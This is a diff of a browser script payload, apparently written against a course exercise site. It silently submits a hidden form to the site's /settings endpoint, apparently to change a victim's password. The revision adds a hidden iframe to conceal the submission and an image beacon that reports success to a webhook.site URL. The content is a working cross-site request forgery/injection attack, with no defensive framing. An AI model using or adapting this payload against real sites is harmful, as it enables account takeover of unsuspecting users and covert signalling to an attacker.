@@ -1,5 +1,5 @@
 <script>
-console.log('v6');
+    console.log('v7')
 
 if(document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
@@ -8,9 +8,15 @@ if(document.readyState === 'loading') {
 }
 
 function init() {
+    var iframe = document.createElement('iframe');
+    iframe.name = 'hiddenFrame';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
     var form = document.createElement('form');
     form.method = 'POST';
     form.action = 'https://cats.is-course.ru/settings';
+    form.target = 'hiddenFrame';
     form.style.display = 'none';
 
     var pass1 = document.createElement('input');
@@ -26,9 +32,7 @@ function init() {
     document.body.appendChild(form);
 
     form.submit();
-    
-    setTimeout(function() {
-        window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?password_changed=true&time=" + Date.now();
-    }, 2000);
+    var img = new Image();
+    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?form_submitted_successfully&time=" + Date.now();
 }
 </script>
